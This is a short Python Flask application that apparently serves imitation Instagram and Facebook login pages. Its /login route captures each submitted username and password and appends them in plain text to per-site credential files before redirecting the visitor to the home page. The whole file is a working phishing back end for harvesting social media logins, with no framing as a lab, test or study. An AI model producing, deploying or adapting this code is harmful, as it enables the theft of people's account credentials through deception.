from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__, template_folder='.')

# Route for the home page (index.html)
@app.route('/')
def index():
    return render_template('index.html')

# Route for the Instagram page (instagram.html)
@app.route('/instagram')
def instagram():
    return render_template('instagram.html')

# Route for the Facebook page (facebook.html)
@app.route('/facebook')
def facebook():
    return render_template('facebook.html')

# Route to handle login form submissions
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if 'instagram' in request.referrer:
        filename = 'instagram_credentials.txt'
    elif 'facebook' in request.referrer:
        filename = 'facebook_credentials.txt'
    else:
        return 'Invalid request'
    
    with open(filename, 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
